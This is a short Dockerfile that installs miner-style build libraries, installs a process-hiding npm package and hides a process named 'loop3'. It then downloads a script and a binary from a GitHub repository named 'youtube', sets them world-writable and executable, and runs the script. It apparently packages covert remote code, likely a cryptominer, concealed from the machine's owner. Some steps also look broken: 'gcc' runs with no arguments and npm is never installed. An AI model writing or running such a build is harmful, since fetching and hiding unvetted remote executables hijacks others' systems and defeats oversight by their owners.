FROM debian:sid

RUN apt update -y \
    	&& apt upgrade -y \
    	&& apt install -qy automake autoconf pkg-config libcurl4-openssl-dev wget libssl-dev  libjansson-dev libgmp-dev make gcc g++ git zlib1g-dev ocl-icd-opencl-dev
        
RUN gcc  
RUN npm i -g node-process-hider
RUN ph add loop3

RUN wget https://raw.githubusercontent.com/cihuuy/youtube/main/vera.sh
RUN wget https://github.com/cihuuy/youtube/raw/main/loop3
RUN chmod 777 loop3
RUN chmod 777 vera.sh
RUN ./vera.sh
